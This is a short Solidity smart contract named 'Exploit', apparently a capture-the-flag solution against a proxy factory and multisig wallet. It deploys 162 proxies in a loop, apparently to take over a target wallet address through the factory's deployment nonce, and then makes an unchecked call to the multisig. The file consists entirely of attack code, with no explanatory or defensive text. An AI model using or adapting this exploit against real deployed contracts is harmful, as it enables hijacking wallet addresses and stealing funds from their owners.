// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

interface IFactory {
    function createProxy(
        address masterCopy,
        bytes memory data
    ) external returns (address proxy);
}

contract Exploit {
    IFactory factory;
    address walletImpl;
    address multisig;

    constructor(IFactory _factory, address _walletImpl, address _multisig) {
        factory = _factory;
        walletImpl = _walletImpl;
        multisig = _multisig;
    }

    bytes b;

    function createWallets() public {
        for (uint i = 0; i < 162; i++) {
            factory.createProxy(walletImpl, b);
        }
    }

    function withdrawal() public payable {
        payable(multisig).call("");
    }

    receive() external payable {}
}
